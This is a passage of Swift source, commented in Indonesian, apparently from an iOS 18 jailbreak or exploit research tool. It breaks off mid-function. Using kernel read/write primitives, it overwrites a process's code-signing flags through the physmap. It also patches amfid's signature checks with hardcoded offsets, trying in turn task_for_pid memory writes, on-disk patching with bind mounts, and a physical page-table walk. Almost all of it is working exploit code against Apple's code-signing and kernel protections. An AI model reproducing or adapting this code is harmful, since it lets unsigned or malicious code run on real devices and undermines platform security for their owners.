            detail += "Next: use physmap VA (gVirtBase formula) to read L1 directly\n"
            detail += "L1 PA known from TTBR — compute physmap VA and read\n"
        } else {
            detail += "DART object not found in ±4MB zone scan\n"
            detail += "Next: expand scan range or scan wired memory region\n"
        }
        
        let success = dartMmioVA != 0 || confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
        return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 83: CS Flags Bypass via Physmap

    /// Modifikasi cs_flags di proc_ro binary target via physmap VA.
    ///
    /// Strategi:
    ///   1. Cari proc binary target via procbyname (dari path basename)
    ///   2. Baca proc_ro pointer dari proc (off_proc_p_proc_ro)
    ///   3. Hitung physical address proc_ro → physmap VA
    ///   4. Baca cs_flags di proc_ro+0x1c via physmap VA
    ///   5. Tulis cs_flags |= CS_VALID | CS_PLATFORM_BINARY via physmap VA
    ///
    /// Kenapa physmap bypass KTRR:
    ///   - KTRR melindungi VA __DATA kernel (static mapping)
    ///   - proc_ro ada di zone allocator (heap), bukan __DATA
    ///   - Physmap adalah mapping BERBEDA dari physical memory yang sama
    ///   - Write via physmap VA tidak trigger KTRR protection
    ///
    /// cs_flags layout di proc_ro (iOS 18 / A12):
    ///   proc_ro+0x00: p_list (8B)
    ///   proc_ro+0x08: p_proc back pointer (8B)
    ///   proc_ro+0x10: p_ucred (8B)
    ///   proc_ro+0x18: pr_task (8B)
    ///   proc_ro+0x1c: p_csflags (4B) ← target
    ///
    /// Note: offset 0x1c sudah dikonfirmasi dari kode existing (dspmgr.swift readCSFlags).
    private func expCSFlagsBypass(targetBinary: String) -> ExperimentResult {
        let expName = "CS Flags Bypass (Exp 83)"
        var detail = "Experiment 83: CS Flags Bypass via Physmap\n"
        detail += "==========================================\n\n"

        // ── Prerequisite checks ──────────────────────────────────────
        guard PhysmapConstants.isVerified else {
            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        guard let physmap = PhysmapConstants.load() else {
            detail += "❌ Physmap constants tidak tersedia.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // ── Step 1: Resolve target process ───────────────────────────
        // Ambil basename dari path (e.g. "/usr/bin/id" → "id")
        let procName = (targetBinary as NSString).lastPathComponent
        detail += "Target binary: \(targetBinary)\n"
        detail += "Process name: \(procName)\n\n"

        // Coba cari via procbyname dulu, fallback ke our proc untuk self-test
        var targetProc: UInt64 = 0
        var targetPid: Int32 = 0

        // Cari proses yang sedang berjalan dengan nama ini
        targetProc = mgr.findProc(name: procName)
        if targetProc == 0 {
            // Fallback: coba our own proc untuk self-test
            targetProc = ds_get_our_proc()
            targetPid = getpid()
            detail += "⚠️ Proses '\(procName)' tidak ditemukan — pakai our proc (self-test)\n"
            detail += "Our proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
        } else {
            targetPid = Int32(bitPattern: ds_kread32(targetProc + UInt64(off_proc_p_pid)))
            detail += "✅ Found proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
        }

        guard targetProc != 0 else {
            detail += "❌ Tidak bisa resolve target proc.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Read proc_ro pointer ─────────────────────────────
        detail += "=== Step 2: Read proc_ro ===\n"
        let procRoVA = ds_kread64(targetProc + UInt64(off_proc_p_proc_ro))
        detail += "proc_ro VA: 0x\(String(format: "%llx", procRoVA))\n"

        guard procRoVA != 0, isSafeKernelHeapKreadAddress(procRoVA) else {
            detail += "❌ proc_ro pointer tidak valid atau di luar zone allocator.\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            detail += "  Got: 0x\(String(format: "%llx", procRoVA))\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Dump proc_ro untuk verifikasi layout
        detail += "proc_ro dump (first 0x30 bytes):\n"
        for off: UInt64 in stride(from: 0, to: 0x30, by: 8) {
            let v = ds_kread64(procRoVA + off)
            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
        }
        detail += "\n"

        // ── Step 3: Read cs_flags via heap KRW ───────────────────────
        detail += "=== Step 3: Read cs_flags ===\n"
        let csFlagsOffset: UInt64 = 0x1c
        let csFlagsVA = procRoVA + csFlagsOffset
        let csFlagsBefore = ds_kread32(csFlagsVA)
        detail += "cs_flags VA: 0x\(String(format: "%llx", csFlagsVA))\n"
        detail += "cs_flags (before): 0x\(String(format: "%08x", csFlagsBefore))\n"

        // Decode flags
        let flagNames: [(UInt32, String)] = [
            (0x00000001, "CS_VALID"),
            (0x00000002, "CS_ADHOC"),
            (0x00000004, "CS_GET_TASK_ALLOW"),
            (0x00000008, "CS_INSTALLER"),
            (0x00000010, "CS_FORCED_LV"),
            (0x00000020, "CS_INVALID_ALLOWED"),
            (0x00000040, "CS_HARD"),
            (0x00000080, "CS_KILL"),
            (0x00000100, "CS_CHECK_EXPIRATION"),
            (0x00000200, "CS_RESTRICT"),
            (0x00000400, "CS_ENFORCEMENT"),
            (0x00000800, "CS_REQUIRE_LV"),
            (0x00001000, "CS_ENTITLEMENTS_VALIDATED"),
            (0x00002000, "CS_NO_UNTRUSTED_HELPERS"),
            (0x00004000, "CS_DEBUGGED"),
            (0x00008000, "CS_SIGNED"),
            (0x00010000, "CS_DEV_CODE"),
            (0x00020000, "CS_DATAVAULT_CONTROLLER"),
            (0x00040000, "CS_ENTITLEMENT_FLAGS"),
            (0x00100000, "CS_PLATFORM_BINARY"),
            (0x00200000, "CS_PLATFORM_PATH"),
            (0x00400000, "CS_DEBUGGER"),
            (0x00800000, "CS_INSTALLER_SIGNED"),
            (0x01000000, "CS_RUNTIME"),
            (0x02000000, "CS_LINKER_SIGNED"),
            (0x04000000, "CS_ALLOWED_MACHO"),
            (0x08000000, "CS_EXEC_SET_HARD"),
            (0x10000000, "CS_EXEC_SET_KILL"),
            (0x20000000, "CS_EXEC_SET_ENFORCEMENT"),
            (0x40000000, "CS_EXEC_INHERIT_SIP"),
            (0x80000000, "CS_KILLED"),
        ]
        for (flag, name) in flagNames {
            if csFlagsBefore & flag != 0 {
                detail += "  ✓ \(name) (0x\(String(format: "%x", flag)))\n"
            }
        }
        detail += "\n"

        // ── Step 4: Compute physmap VA dari proc_ro physical address ──
        detail += "=== Step 4: Compute physmap VA ===\n"

        // proc_ro ada di zone allocator (heap), bukan __DATA
        // Untuk mendapat physical address: VA - gVirtBase + gPhysBase
        // Tapi gVirtBase adalah base physmap, bukan base zone allocator
        // Zone allocator VA range: 0xffffffdd... - 0xffffffe5...
        // Physical address = VA - gVirtBase + gPhysBase
        // (karena physmap maps physical memory starting at gPhysBase to VA gVirtBase)

        // Verifikasi: proc_ro VA harus dalam zone allocator range
        guard isSafeKernelHeapKreadAddress(procRoVA) else {
            detail += "❌ proc_ro VA 0x\(String(format: "%llx", procRoVA)) bukan di zone allocator\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Hitung physical address proc_ro
        // Zone allocator pages di-map oleh physmap: phys = VA - gVirtBase + gPhysBase
        let procRoPhys = procRoVA &- gVirtBase &+ gPhysBase
        detail += "proc_ro phys: 0x\(String(format: "%llx", procRoPhys))\n"

        // Verifikasi physical address masuk akal (DRAM range A12: 0x800000000 - 0x900000000)
        guard procRoPhys >= 0x800000000 && procRoPhys < 0xC00000000 else {
            detail += "❌ proc_ro phys 0x\(String(format: "%llx", procRoPhys)) di luar DRAM range\n"
            detail += "  Expected: 0x800000000 - 0xC00000000\n"
            detail += "  Kemungkinan gVirtBase salah — jalankan Exp 74 ulang\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Hitung physmap VA untuk cs_flags
        let csFlagsPhys = procRoPhys &+ csFlagsOffset
        let csFlagsPhysmapVA = csFlagsPhys &- gPhysBase &+ gVirtBase

        detail += "cs_flags phys: 0x\(String(format: "%llx", csFlagsPhys))\n"
        detail += "cs_flags physmap VA: 0x\(String(format: "%llx", csFlagsPhysmapVA))\n"

        // Verifikasi physmap VA aman untuk write
        guard isSafePhysmapKRWAddress(csFlagsPhysmapVA) else {
            detail += "❌ cs_flags physmap VA tidak aman untuk KRW\n"
            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Physmap VA valid untuk write\n\n"

        // ── Step 5: Verify read via physmap VA matches heap KRW ──────
        detail += "=== Step 5: Cross-verify physmap read ===\n"
        let csFlagsViaPhysmap = ds_kread32(csFlagsPhysmapVA)
        detail += "cs_flags via heap KRW:   0x\(String(format: "%08x", csFlagsBefore))\n"
        detail += "cs_flags via physmap VA: 0x\(String(format: "%08x", csFlagsViaPhysmap))\n"

        guard csFlagsViaPhysmap == csFlagsBefore else {
            detail += "❌ Mismatch! Physmap VA tidak menunjuk ke proc_ro yang sama.\n"
            detail += "  Kemungkinan gVirtBase tidak akurat — jalankan Exp 74 ulang.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        detail += "✅ Cross-verify OK — physmap VA menunjuk ke proc_ro yang benar\n\n"

        // ── Step 6: Write cs_flags — direct heap KRW dulu, physmap sebagai fallback ──
        detail += "=== Step 6: Write cs_flags ===\n"

        let CS_VALID:           UInt32 = 0x00000001
        let CS_PLATFORM_BINARY: UInt32 = 0x00100000
        let CS_HARD:            UInt32 = 0x00000040
        let CS_KILL:            UInt32 = 0x00000080

        let newFlags = (csFlagsBefore | CS_VALID | CS_PLATFORM_BINARY) & ~(CS_HARD | CS_KILL)
        detail += "New cs_flags: 0x\(String(format: "%08x", newFlags))\n"
        detail += "  + CS_VALID (0x1)\n"
        detail += "  + CS_PLATFORM_BINARY (0x100000)\n"
        detail += "  - CS_HARD (0x40)\n"
        detail += "  - CS_KILL (0x80)\n\n"

        // Attempt 1: Direct heap KRW write (sama seperti dspmgr.setCSFlags)
        // proc_ro di zone allocator — ds_kwrite32 langsung ke heap VA
        detail += "Attempt 1: direct heap KRW (ds_kwrite32)...\n"
        ds_kwrite32(csFlagsVA, newFlags)
        let afterAttempt1 = ds_kread32(csFlagsVA)
        detail += "  cs_flags after heap write: 0x\(String(format: "%08x", afterAttempt1))\n"
        let heapWriteOK = afterAttempt1 == newFlags

        // Attempt 2: Physmap write (bypass zone RO protection jika ada)
        detail += "Attempt 2: physmap write (safeKwrite32Physmap)...\n"
        _ = safeKwrite32Physmap(csFlagsPhysmapVA, newFlags)
        let afterAttempt2heap = ds_kread32(csFlagsVA)
        let afterAttempt2phys = ds_kread32(csFlagsPhysmapVA)
        detail += "  cs_flags after physmap write (heap read):   0x\(String(format: "%08x", afterAttempt2heap))\n"
        detail += "  cs_flags after physmap write (physmap read): 0x\(String(format: "%08x", afterAttempt2phys))\n"
        let physmapWriteOK = afterAttempt2heap == newFlags || afterAttempt2phys == newFlags

        detail += "\nHeap write OK: \(heapWriteOK)\n"
        detail += "Physmap write OK: \(physmapWriteOK)\n\n"

        // ── Step 7: Verify write ──────────────────────────────────────
        detail += "=== Step 7: Verify write ===\n"
        let csFlagsAfterHeap = ds_kread32(csFlagsVA)
        let csFlagsAfterPhysmap = ds_kread32(csFlagsPhysmapVA)
        detail += "cs_flags after (heap KRW):   0x\(String(format: "%08x", csFlagsAfterHeap))\n"
        detail += "cs_flags after (physmap VA): 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"

        let writeVerified = heapWriteOK || physmapWriteOK
        if writeVerified {
            let finalFlags = csFlagsAfterHeap != csFlagsBefore ? csFlagsAfterHeap : csFlagsAfterPhysmap
            detail += "✅ Write berhasil!\n\n"
            detail += "=== HASIL ===\n"
            detail += "Binary: \(targetBinary)\n"
            detail += "PID: \(targetPid)\n"
            detail += "cs_flags: 0x\(String(format: "%08x", csFlagsBefore)) → 0x\(String(format: "%08x", finalFlags))\n"
            detail += "CS_PLATFORM_BINARY: \(finalFlags & CS_PLATFORM_BINARY != 0 ? "✅ SET" : "❌ NOT SET")\n"
            detail += "Metode: \(heapWriteOK ? "heap KRW" : "physmap")\n\n"
            detail += "→ Lanjut: jalankan ④ Test Binary Spawn untuk verifikasi AMFI bypass\n"
            detail += "→ Jika spawn berhasil tanpa SIGKILL = AMFI bypass confirmed!\n"
        } else {
            detail += "❌ Write tidak terverifikasi — proc_ro di-protect zone RO.\n"
            detail += "  Expected: 0x\(String(format: "%08x", newFlags))\n"
            detail += "  Got heap: 0x\(String(format: "%08x", csFlagsAfterHeap))\n"
            detail += "  Got physmap: 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n\n"
            detail += "Diagnosis:\n"
            detail += "  proc_ro zone di iOS 18 di-protect hardware (zone_require_ro)\n"
            detail += "  Physmap write juga tidak efektif — physical page read-only\n"
            detail += "  Jalur selanjutnya: patch amfid memory untuk skip signature check\n"
        }

        return ExperimentResult(name: expName, success: writeVerified, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 84: amfid Patch via Physmap

    // MARK: - Exp 84 v2: amfid Patch via task_for_pid + mach_vm_write

    /// Exp 84 v2: Patch amfid dari launchd RC via task_for_pid.
    /// Hardcoded offsets dari on-device analysis.
    /// Semua 13 BL+CBNZ W0 target fungsi yang sama = signature check.
    /// Patch: NOP semua CBNZ W0 → amfid skip error branch → always allow.
    ///
    /// Flow:
    ///   1. Dari launchd RC, panggil task_for_pid(amfid_pid) → amfid task port
    ///   2. mach_vm_protect: make amfid __TEXT writable (VM_PROT_READ|WRITE|EXECUTE)
    ///   3. mach_vm_write: tulis NOP (0xD503201F) ke setiap CBNZ offset
    ///   4. Verify: mach_vm_read kembali untuk konfirmasi
    ///   5. Test spawn binary unsigned
    #if !DISABLE_REMOTECALL
    private func expAmfidPatchV2(rc: RemoteCall) -> ExperimentResult {
        let expName = "amfid Patch v2 (Exp 84)"
        var detail = "Experiment 84 v2: amfid Patch via task_for_pid\n"
        detail += "================================================\n\n"

        let mem = rc.trojanMem
        let mgr = dspmgr.shared

        // ── Hardcoded patch offsets (dari on-device analysis) ─────────
        // amfid __TEXT base: 0x100000000 (in-binary), runtime: 0x16cd60000
        // Semua offset relatif dari runtime __TEXT base
        let amfidTextOffsets: [UInt64] = [
            0x274c, 0x2764, 0x2c68, 0x2d68, 0x33c0,
            0x348c, 0x372c, 0x3a9c, 0x3f24, 0x4164,
            0x41ec, 0x4284, 0x431c,
        ]
        let NOP: UInt32 = 0xD503201F

        // ── Step 1: Find amfid PID ───────────────────────────────────
        detail += "=== Step 1: Find amfid ===\n"
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "❌ amfid tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n\n"

        // ── Step 2: task_for_pid dari launchd ────────────────────────
        detail += "=== Step 2: task_for_pid(\(amfidPid)) ===\n"

        // task_for_pid(mach_task_self(), pid, &task_port)
        let taskSelf = RootExecutor.rcall(rc, "mach_task_self")
        let taskPortAddr = mem + 0x1A00
        rc[taskPortAddr].setValue32(0)

        let tfpRet = RootExecutor.rcall(rc, "task_for_pid", taskSelf, UInt64(amfidPid), taskPortAddr)
        let amfidTaskPort = rc[taskPortAddr].value32()
        detail += "task_for_pid ret: \(tfpRet) (0=success)\n"
        detail += "amfid task port: \(amfidTaskPort)\n"

        guard tfpRet == 0 && amfidTaskPort != 0 else {
            detail += "❌ task_for_pid gagal (ret=\(tfpRet)).\n\n"

            // ══════════════════════════════════════════════════════════
            // FALLBACK: Patch amfid binary ON-DISK
            // Tulis NOP ke /usr/libexec/amfid file langsung
            // Lalu kill amfid → launchd restart → patched version jalan
            // ══════════════════════════════════════════════════════════
            detail += "=== Fallback: Patch amfid ON-DISK ===\n"
            detail += "Strategi: tulis NOP ke file /usr/libexec/amfid, lalu kill amfid.\n"
            detail += "Launchd akan restart amfid dari disk → patched version.\n\n"

            let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
            let nopBuf = mem + 0x2000

            // Open amfid for read+write
            let fd = RootExecutor.rcall(rc, "open", amfidPath, UInt64(O_RDWR), 0)
            guard fd != UInt64(bitPattern: -1) else {
                let err = remote_errno(rc)
                detail += "❌ open(/usr/libexec/amfid, O_RDWR) gagal: errno=\(err)\n"
                if err == 1 { detail += "  EPERM — filesystem mungkin read-only (SSV/snapshot)\n" }
                if err == 30 { detail += "  EROFS — Read-only file system\n" }

                // ══════════════════════════════════════════════════════
                // FALLBACK 2: Copy amfid ke /var, patch, bind mount
                // /var is writable! Copy → patch → mount over original
                // ══════════════════════════════════════════════════════
                detail += "\n=== Fallback 2: Copy + Patch + Bind Mount ===\n"
                detail += "Rootfs read-only → copy amfid ke /var (writable), patch, bind mount.\n\n"

                let patchedPath = "/var/tmp/.amfid_patched"
                let patchedPathAddr = remote_alloc_str(rc, patchedPath)

                // Step A: Copy amfid ke /var/tmp
                detail += "Step A: Copy amfid ke \(patchedPath)...\n"
                RootExecutor.rcall(rc, "unlink", patchedPathAddr)

                let srcFd = RootExecutor.rcall(rc, "open", amfidPath, UInt64(O_RDONLY), 0)
                let dstFd = RootExecutor.rcall(rc, "open", patchedPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

                guard srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) else {
                    let copyErr = remote_errno(rc)
                    detail += "❌ Copy gagal: errno=\(copyErr)\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                let copyBuf = mem + 0x2200
                var totalCopied: UInt64 = 0
                for _ in 0..<512 {
                    let n = RootExecutor.rcall(rc, "read", srcFd, copyBuf, 4096)
                    if n == 0 || n > 4096 { break }
                    RootExecutor.rcall(rc, "write", dstFd, copyBuf, n)
                    totalCopied += n
                }
                RootExecutor.rcall(rc, "close", srcFd)
                RootExecutor.rcall(rc, "close", dstFd)
                detail += "✅ Copied \(totalCopied) bytes\n\n"

                // Step B: Patch the copy (writable!)
                detail += "Step B: Patch \(patchedPath)...\n"
                let patchFd = RootExecutor.rcall(rc, "open", patchedPathAddr, UInt64(O_RDWR), 0)
                guard patchFd != UInt64(bitPattern: -1) else {
                    let patchErr = remote_errno(rc)
                    detail += "❌ open patched file gagal: errno=\(patchErr)\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                var bindPatched = 0
                for (i, offset) in amfidTextOffsets.enumerated() {
                    RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
                    let rdBuf = mem + 0x2300
                    RootExecutor.rcall(rc, "read", patchFd, rdBuf, 4)
                    let orig = rc[rdBuf].value32()

                    let isCBNZ = (orig >> 24) == 0x35 && (orig & 0x1F) == 0
                    guard isCBNZ else { continue }

                    RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
                    rc[nopBuf].setValue32(NOP)
                    let wn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 4)
                    if wn == 4 {
                        bindPatched += 1
                        if bindPatched <= 5 {
                            detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): NOP\n"
                        }
                    }
                }

                // Patch signature check function (offset 0x1c830)
                RootExecutor.rcall(rc, "lseek", patchFd, 0x1c830, 0)
                rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
                rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
                let sigWn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 8)
                if sigWn == 8 {
                    bindPatched += 1
                    detail += "  ✅ +0x1c830: MOV W0,#0 + RET\n"
                }

                RootExecutor.rcall(rc, "close", patchFd)

                if bindPatched > 5 {
                    detail += "  ... dan \(bindPatched - 5) lainnya\n"
                }
                detail += "\nPatched: \(bindPatched) instruksi\n\n"

                guard bindPatched > 0 else {
                    detail += "❌ Patch gagal.\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                // Step C: Bind mount patched file over original
                detail += "Step C: Mount patched over /usr/libexec/amfid...\n"

                // Coba mount_bindfs / mount nullfs
                // iOS: mount("bindfs", "/usr/libexec/amfid", 0, "/var/tmp/.amfid_patched")
                // Atau: mount("nullfs", target, 0, source)
                let bindfsType = remote_alloc_str(rc, "bindfs")
                let nullfsType = remote_alloc_str(rc, "nullfs")
                let mountTarget = remote_alloc_str(rc, "/usr/libexec/amfid")

                // Try bindfs first
                var mountRet = RootExecutor.rcall(rc, "mount", bindfsType, mountTarget, 0, patchedPathAddr)
                var mountErr = remote_errno(rc)
                detail += "mount(bindfs): ret=\(mountRet), errno=\(mountErr)\n"

                if mountRet != 0 {
                    // Try nullfs
                    mountRet = RootExecutor.rcall(rc, "mount", nullfsType, mountTarget, 0, patchedPathAddr)
                    mountErr = remote_errno(rc)
                    detail += "mount(nullfs): ret=\(mountRet), errno=\(mountErr)\n"
                }

                RootExecutor.rcall(rc, "free", bindfsType)
                RootExecutor.rcall(rc, "free", nullfsType)
                RootExecutor.rcall(rc, "free", mountTarget)

                if mountRet != 0 {
                    // Mount gagal — FALLBACK 3: Patch amfid IN-MEMORY via physmap
                    detail += "\n⚠️ Bind mount tidak tersedia di iOS 18.\n"
                    detail += "=== Fallback 3: Patch amfid memory via physmap ===\n\n"

                    // Kita tahu:
                    // - amfid __TEXT runtime: dari vm_map walk (Step 2 Exp 84 sebelumnya)
                    // - amfid pmap: dari vm_map+0x40
                    // - Physical TTBR di pmap+0x08
                    // - gVirtBase/gPhysBase dari Exp 74
                    //
                    // Flow: pmap+0x08 (physical TTBR) → physmap VA → walk L1→L2→L3
                    //       → physical address amfid text → physmap VA → write NOP

                    guard let physmap = PhysmapConstants.load() else {
                        detail += "❌ Physmap constants tidak tersedia.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    let gVirtBase = physmap.gVirtBase
                    let gPhysBase = physmap.gPhysBase

                    // Re-read amfid task dan pmap
                    let amfidProcRo2 = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
                    let amfidTask2 = amfidProcRo2 != 0 ? ds_kread64(amfidProcRo2 + UInt64(off_proc_ro_pr_task)) : 0
                    var amfidPmap2: UInt64 = 0
                    if amfidTask2 != 0 {
                        let vm2 = task_get_vm_map(amfidTask2)
                        if vm2 != 0 {
                            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x38] {
                                let c = ds_kreadptr(vm2 + off)
                                if isLikelyKernelPointer(c) && pmapCandidateScore(c) >= 3 {
                                    amfidPmap2 = c
                                    break
                                }
                            }
                        }
                    }

                    detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap2))\n"

                    guard amfidPmap2 != 0 else {
                        detail += "❌ amfid pmap tidak ditemukan.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Read physical TTBR dari pmap+0x08 (RAW, tanpa PAC strip)
                    let physTTBR = ds_kread64_safe(amfidPmap2 + 8)
                    detail += "Physical TTBR (pmap+0x08): 0x\(String(format: "%llx", physTTBR))\n"

                    guard isReasonablePhysTT(physTTBR) else {
                        detail += "❌ TTBR bukan physical address valid.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Convert TTBR physical → physmap VA
                    let ttbrPhysmapVA = physTTBR &- gPhysBase &+ gVirtBase
                    detail += "TTBR physmap VA: 0x\(String(format: "%llx", ttbrPhysmapVA))\n"

                    guard ttbrPhysmapVA >= 0xffffffdc00000000 && ttbrPhysmapVA < 0xffffffe500000000 else {
                        detail += "❌ TTBR physmap VA tidak dalam range physmap.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Helper: physmap range check (lebih permissive dari isSafePhysmapKRWAddress
                    // yang exclude gVirtBase region — tapi page table walk PERLU akses situ)
                    func isPhysmapRange(_ va: UInt64) -> Bool {
                        va >= 0xffffffdc00000000 && va < 0xffffffe500000000
                    }

                    // amfid __TEXT runtime base dari vm_map walk sebelumnya
                    // Hardcode dari Exp 84 hasil: 0x16cd60000
                    // Tapi bisa berubah (ASLR) — pakai yang dari Step 2 foto: 0x16cd60000
                    let amfidRuntimeText: UInt64 = 0x16cd60000

                    // Page table walk: untuk setiap patch offset, resolve physical address
                    detail += "\nPatching via physmap page table walk...\n"

                    var physmapPatched = 0
                    for (i, offset) in amfidTextOffsets.enumerated() {
                        let targetVA = amfidRuntimeText + offset
                        let l1Idx = (targetVA >> 36) & 0x7
                        let l2Idx = (targetVA >> 25) & 0x7FF
                        let l3Idx = (targetVA >> 14) & 0x7FF
                        let pageOff = targetVA & 0x3FFF

                        // L1: TTBR is the L1 table (or L2 for 3-level)
                        // arm64 userspace with 16KB pages: might be 3-level (L1→L2→L3)
                        // or 2-level (L2→L3) depending on VA size
                        // amfid VA 0x16cd60000: bit[38:36]=0, bit[35:25]=0xB66, bit[24:14]=0x360

                        // Try as L1 table first
                        let l1Entry = ds_kread64_safe(ttbrPhysmapVA + l1Idx * 8)

                        var l2PhysmapVA: UInt64 = 0
                        if l1Entry & 0x3 == 0x3 {
                            // Valid L1 table descriptor → points to L2
                            let l2Phys = l1Entry & 0x0000FFFFFFFC0000
                            l2PhysmapVA = l2Phys &- gPhysBase &+ gVirtBase
                        } else {
                            // Maybe TTBR IS the L2 table directly (2-level page table)
                            l2PhysmapVA = ttbrPhysmapVA
                        }

                        guard isPhysmapRange(l2PhysmapVA) else { continue }

                        let l2Entry = ds_kread64_safe(l2PhysmapVA + l2Idx * 8)
                        guard l2Entry & 0x3 == 0x3 else { continue }

                        let l3Phys = l2Entry & 0x0000FFFFFFFC0000
                        let l3PhysmapVA = l3Phys &- gPhysBase &+ gVirtBase
                        guard isPhysmapRange(l3PhysmapVA) else { continue }

                        let l3Entry = ds_kread64_safe(l3PhysmapVA + l3Idx * 8)
                        guard l3Entry & 0x1 == 0x1 else { continue }

                        let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                        let instrPhysmapVA = (pagePhys &- gPhysBase &+ gVirtBase) + pageOff

                        guard isPhysmapRange(instrPhysmapVA) else { continue }

                        // Read original instruction
                        let origInstr = ds_kread32(instrPhysmapVA)
                        let isCBNZ = (origInstr >> 24) == 0x35 && (origInstr & 0x1F) == 0
                        guard isCBNZ else {
                            if i == 0 {
                                detail += "  [\(i)] 0x\(String(format: "%08x", origInstr)) — bukan CBNZ (page table mungkin salah)\n"
                            }
                            continue
                        }

                        // WRITE NOP via physmap!
                        ds_kwrite32(instrPhysmapVA, NOP)

                        // Verify
                        let afterInstr = ds_kread32(instrPhysmapVA)
                        if afterInstr == NOP {
                            physmapPatched += 1
                            if physmapPatched <= 5 {
                                detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): NOP (via physmap)\n"
                            }
                        }
                    }

                    // Also patch signature check function (0x1c830)
                    let sigOff: UInt64 = 0x1c830
                    let sigVA = amfidRuntimeText + sigOff
                    let sigL1Idx = (sigVA >> 36) & 0x7
                    let sigL2Idx = (sigVA >> 25) & 0x7FF
                    let sigL3Idx = (sigVA >> 14) & 0x7FF
                    let sigPageOff = sigVA & 0x3FFF

                    let sigL1 = ds_kread64_safe(ttbrPhysmapVA + sigL1Idx * 8)
                    var sigL2VA: UInt64 = sigL1 & 0x3 == 0x3 ? ((sigL1 & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase) : ttbrPhysmapVA
                    if isPhysmapRange(sigL2VA) {
                        let sigL2 = ds_kread64_safe(sigL2VA + sigL2Idx * 8)
                        if sigL2 & 0x3 == 0x3 {
                            let sigL3Phys = sigL2 & 0x0000FFFFFFFC0000
                            let sigL3VA = sigL3Phys &- gPhysBase &+ gVirtBase
                            if isPhysmapRange(sigL3VA) {
                                let sigL3 = ds_kread64_safe(sigL3VA + sigL3Idx * 8)
                                if sigL3 & 0x1 == 0x1 {
                                    let sigPagePhys = sigL3 & 0x0000FFFFFFFC0000
                                    let sigInstrVA = (sigPagePhys &- gPhysBase &+ gVirtBase) + sigPageOff
                                    if isPhysmapRange(sigInstrVA) {
                                        // Write MOV W0, #0 + RET
                                        ds_kwrite32(sigInstrVA, 0x52800000)
                                        ds_kwrite32(sigInstrVA + 4, 0xD65F03C0)
                                        let v0 = ds_kread32(sigInstrVA)
                                        let v1 = ds_kread32(sigInstrVA + 4)
                                        if v0 == 0x52800000 && v1 == 0xD65F03C0 {
                                            physmapPatched += 1
                                            detail += "  ✅ +0x1c830: MOV W0,#0 + RET (via physmap)\n"
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if physmapPatched > 5 {
